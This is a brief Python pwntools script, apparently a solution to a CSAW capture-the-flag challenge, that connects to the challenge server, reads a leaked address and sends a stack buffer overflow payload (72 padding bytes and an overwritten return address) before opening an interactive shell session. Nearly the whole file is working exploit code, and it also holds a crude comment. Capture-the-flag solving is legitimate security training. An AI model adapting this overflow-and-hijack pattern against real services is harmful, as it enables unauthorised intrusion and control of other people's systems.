#!/usr/bin/python


from pwn import *
with open('payload', 'w') as f:
	f.write('')

def send(conn, line):
	print line
	conn.sendline(line)

	with open('payload', 'a') as f:
		line += '\x0a' # fuck you :)
		f.write(line)

conn = remote("pwn.chal.csaw.io",8000)


print conn.recvuntil("WOW:")
addr = conn.recvuntil("\n")



send(conn,"AAAA"*18 + p64(0x40060d))
conn.interactive()